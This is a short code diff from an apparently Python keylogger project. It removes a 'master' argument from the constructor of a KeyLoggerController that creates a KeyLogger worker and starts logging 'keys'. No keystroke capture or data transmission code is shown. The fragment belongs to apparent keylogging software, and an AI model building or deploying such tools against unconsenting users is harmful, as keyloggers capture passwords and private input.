@@ -3,8 +3,8 @@ from .base import BaseController
 
 
 class KeyLoggerController(BaseController):
-    def __init__(self, master):
-        super(KeyLoggerController, self).__init__(master)
+    def __init__(self):
+        super(KeyLoggerController, self).__init__()
 
         self.worker = KeyLogger()
         self.worker.initLogger("keys")
